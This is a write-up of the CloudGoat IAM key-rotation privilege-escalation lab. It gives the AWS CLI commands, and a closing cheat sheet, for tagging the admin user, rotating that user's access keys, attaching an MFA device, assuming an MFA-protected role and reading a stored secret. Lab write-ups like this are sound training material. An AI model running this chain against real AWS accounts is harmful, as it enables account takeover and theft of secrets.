---
title: "Cloudgoat IAM Privesc By Key Rotation"
date: 2025-05-27
draft: false
language: en
featured_image: ../assets/images/posts/iam_privesc_by_key_rotation_cloudgoat_challenge_logo.png
summary: A walkthrough of the IAM Privesc by Key Rotation easy Cloudgoat challenge
authorimage: ../assets/images/posts/cyber-immuno-fusion.png
categories: Blog
tags: ["AWS Pentesting", "IAM", "Cloudgoat"]
---
# Introduction & Context

Hey guys! This is a write-up for the iam_privesc_by_key_rotation challenge from Cloudgoat that you can find [here](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_key_rotation/README.md). The lab focuses on doing some enumeration to find some poorly designed security mechanisms usings tags. Utilizing the misconfiguration you can become admin and then set up MFA to gain access to the final role and grab the flag. I'll walk through how I did it, including any rabbit holes (I'll point them out) I went down. I'll provide all commands needed from start to end, so follow along!

# Setup

If you haven't booted the cloudgoat, run `cloudgoat create iam_privesc_by_key_rotation`. This one loaded in underr a minute and it will give you a pair of credentials. Add them using `aws configure --profile iam_key_rotation` (region can be us-east-1 and format as json). Then make sure they actually work by running `aws sts get-caller-identity --profile iam_key_rotation`. Now let's go!

# Enumerate environment using pacu

I'm going to be using [pacu](https://github.com/RhinoSecurityLabs/pacu) to do some of the initial enumeration. Run `pacu` to get the session running and then `import_keys iam_key_rotation` to connect the initial credentials. The two commands to have our inital look around are `run iam__enum_permissions` and `run iam__enum_users_roles_policies_groups`. Those two will give a solid view of the permissions we have any any interesting iam objects lying around. 

Now to see what we can do, just run `whoami`. We have a lot of permission. The thing that caught my eye was this one that would allow us to create and delete access keys if the tag was `developer`. Interesting. If we check the users list we see that there is a developer user that exists. You can check that using `data iam Users` (running `data iam` will give all iam info which may be a bit much). 

## Become the developer 

So this is the rabbit hole I went down. I thought maybe this developer has some elevated permissions and ran `aws iam list-user-policies --profile iam_key_rotation --user-name developer_cgidiirfl3bvbv` to see what policies he had. And he had one called 'DeveloperViewSecrets'! Maybe an easy win? But if you check the permissions of that using `aws iam get-user-policy --profile iam_key_rotation --user-name developer_cgidiirfl3bvbv --policy-name DeveloperViewSecrets` you'll see that he can only list the secrests, not view them. 

I ended up trying anyways to see if maybe he has some other permissions, but nope. He's a dead end. You can of course create an access key for him and take on that user, but all he can do is just tell you that a secret exists.


# Tag the Admin!

So since the developer didn't work, there was one other role left (excluding the cloudgoat one ofc). The admin user. If we looked carefully through the `whoami` command results we ran earlier, you'll notice a few critical permissions: 

* iam:createaccesskey
* iam:deleteaccesskey

However, those could be only done on the developer, or so they thought... The issue here was that we also had the permission 'iam:taguser'. That meant, we could add a tag to any user, and then do all the things we used to be only do to the developer. So let's do that

First up, add the tag using `aws iam tag-user --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv --tags Key=developer,Value=true`

## Escalate

Now we can edit the admin user. First you can try to create a key using `aws iam create-access-key --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv`. But that'll fail. The admin already has 2 keys and we can't add more. 

But we also had permission to delete keys, so let's list the keys they have and just delete one. List them using `aws iam list-access-keys --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv` and delete using `aws iam delete-access-key --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv --access-key-id AKIAVRUVQNVQWOME4UIF`. 

Run the same command to create a key as before and record the results. Configure a new profile using `aws configure --proflile admin` and run a quick check using `aws sts get-caller-identity --profile admin`. You should be in!

# Take on the secret role

Now that you're admin, you can try to grab the secret. But no. Any attempt will fail because even the admin can not view secrests. But you know who can? The secret manager role. If we go back to pacu and check `data iam Roles`, you'll see a secret manager role whose description states they can view secrets. 

So let's try and take on that role! Run `aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg_secretsmanager_cgidiirfl3bvbv --role-session-name magic --profile admin`. But... again we are stopped (temporarily). We don't have the permission to do that. If you noticed earlier the role had a little something saying `aws:MultiFactorAuthPresent`. We can't bypass MFA...

## Bypass MFA

Okay, so for this I had to ask Chat the commands that will allow us to bypass. A keen eye would have noticed during the `whoami` command on the initial user, we had lots of permissions about the mfa that could be applied to the developer role. Well admin has that role. So we're going to use his profile to add mfa to ours!

First, we create a virtual MFA device using `aws iam create-virtual-mfa-device --virtual-mfa-device-name admin-virt-mfa --outfile mfa-qr.png --profile iam_key_rotation --bootstrap-method QRCodePNG`. That will save a png of a QR code to your working directory. 

Open up your phone and use an authenticator app to scan that QR. It should set up pretty quickly. Once done, you'll need to grab two consecutive codes from it. Once you have them replace them here 

```bash
aws iam enable-mfa-device --user-name admin_cgidf88xs8i2ur --serial-number arn:aws:iam::381491899745:mfa/admin-virt-mfa --authentication-code1 CODE1GOESHERE --authentication-code2 CODE2GOESHERE --profile iam_key_rotation
```

That will set up our mfa!

# Access the secret role

We'll need to do a refresh of our keys according to chat, so delete one of the access keys using the same command as earlier (diffferent key though), `aws iam delete-access-key --profile iam_key_rotation --user-name admin_cgidf88xs8i2ur --access-key-id AKIAVRUVQNVQ3RMHLPPL`. 

Make a new key using `aws iam create-access-key --profile iam_key_rotation --user-name admin_cgidf88xs8i2ur`. 

And assume a role (make sure to put a valid token) using `aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg_secretsmanager_cgidf88xs8i2ur --role-session-name magic --serial-number arn:aws:iam::381491899745:mfa/admin-virt-mfa --token-code VALIDTOKENHERE --profile admin`

And you'll have the final set of credentials!

# Grab the secret

Configure the role using `aws configure --profile iam_key_role` and pass in the new values. You'll need to pass in the session token manually using `aws configure set profile.iam_key_role.aws_session_token TOKENGOESHERE`. Once you're in, you can use `aws sts get-caller-identity --profile iam_key_role` to verify your in. And boom! 

Now, I checked the [documentation](https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/get-secret-value.html) for the precise command to find the secret. First list the secrests there using `aws secretsmanager list-secrets --profile iam_key_role`. 

Then grab the flag using: `aws secretsmanager get-secret-value --profile iam_key_role --secret-id arn:aws:secretsmanager:us-east-1:381491899745:cg_secret_cgidf88xs8i2ur-jghZnP`!


# Conclusion

This was a one of the longer labs i've done on cloudgoat. We had to enumerate our environment well and find the misconfigured IAM policies about tags. We had to apply tags, delete and make new keys (even use MFA!) to finally get access to the secret role to grab our flag. A fun lab highlighting the improtance of configuring IAM policies properly. 

*Don't forget to destroy your lab after!*

```bash
cloudgoat destroy iam_privesc_by_key_rotation
```

# Cheat Sheet

To close off, here's a quick summary of the commands we needed to run to complete this module. If you're ever coming back to this and just need that one command, this is the section to check.

```bash
#Start Up
cloudgoat create iam_privesc_by_key_rotation
aws configure --profile iam_key_rotation

#Pacu our permissions
pacu
import_keys sns_low
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
whoami
data iam Users
data iam Roles
exit

#Tag the Admin & Escalate!
aws iam tag-user --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv --tags Key=developer,Value=true
aws iam list-access-keys --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv  
aws iam delete-access-key --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv --access-key-id AKIAVRUVQNVQWOME4UIF
aws iam create-access-key --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv 

#Become admin
aws configure --profile admin
aws sts get-caller-identity --profile admin

#Set up MFA
aws iam create-virtual-mfa-device --virtual-mfa-device-name admin-virt-mfa --outfile mfa-qr.png --profile iam_key_rotation --bootstrap-method QRCodePNG
aws iam enable-mfa-device --user-name admin_cgidf88xs8i2ur --serial-number arn:aws:iam::381491899745:mfa/admin-virt-mfa --authentication-code1 CODE1 --authentication-code2 CODE2 --profile iam_key_rotation

#Delete old key & make fresh one
aws iam delete-access-key --profile iam_key_rotation --user-name admin_cgidf88xs8i2ur --access-key-id AKIAVRUVQNVQ3RMHLPPL
aws iam create-access-key --profile iam_key_rotation --user-name admin_cgidf88xs8i2ur

#Take on role
aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg_secretsmanager_cgidf88xs8i2ur --role-session-name magic --serial-number arn:aws:iam::381491899745:mfa/admin-virt-mfa --token-code 005780 --profile admin
aws configure --profile iam_key_role
aws configure set profile.iam_key_role.aws_session_token TOKEN HERE

#Grab secret
aws secretsmanager list-secrets --profile iam_key_role 
aws secretsmanager get-secret-value --profile iam_key_role --secret-id arn:aws:secretsmanager:us-east-1:381491899745:secret:cg_secret_cgidf88xs8i2ur-jghZnP
```
